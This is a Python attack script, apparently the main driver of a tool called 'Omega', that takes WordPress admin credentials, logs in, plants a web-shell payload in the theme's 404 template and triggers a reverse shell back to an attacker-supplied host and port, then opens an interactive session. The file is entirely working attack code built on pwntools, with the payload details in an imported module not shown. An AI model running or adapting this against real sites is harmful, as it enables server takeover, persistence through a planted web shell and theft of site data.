#!/usr/bin/env python3

import os
import threading
from argparse import Namespace
from pwnlib.log import Logger, install_default_handler
from pwnlib.tubes.listen import listen
from services import LoginService, PayloadService, ShellService, ParametersParserService

install_default_handler()
log = Logger()


def shell_handler(shell: listen):
    while shell.connected('recv'): pass
    shell.shutdown('send')
    os._exit(0)

def main(args: Namespace):
    wp_url = args.wp_url
    username = args.username
    password = args.password
    lhost = args.lhost
    lport = args.lport

    with log.progress('Trying to get an admin session...') as p:
        login_service = LoginService(wp_url)
        login_service.check_admin_login(username, password)
        wp_admin_session = login_service.get_wp_admin_session(username, password)
        p.success('Got admin session!')

    with log.progress('Dropping payload in the current 404 template...') as p:
        payload_service = PayloadService(wp_url, wp_admin_session)
        web_shell_url = payload_service.drop_payload()
        p.success('Payload ready')

    with log.progress('Getting a reverse shell...') as p:
        shell_service = ShellService(web_shell_url, lhost, lport)
        shell = shell_service.prepareListener()
        shell_service.executeRevShell()
        shell.recvline_contains(b'$', timeout=0.5) # Check shell came back
        p.success('Got a shell!')
    
    # Start shell checker to control the closing
    shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
    shell_handler_thread.setDaemon(True)
    shell_handler_thread.start()

    shell.interactive()

if __name__ == '__main__':
    print('Omega - From Wordpress admin to shell\n')

    parameterParserService = ParametersParserService()
    args = parameterParserService.parse_params()

    try:
        main(args)
    except KeyboardInterrupt:
        log.failure('Interrupted')
    except Exception:
        log.failure('Attack failed!')
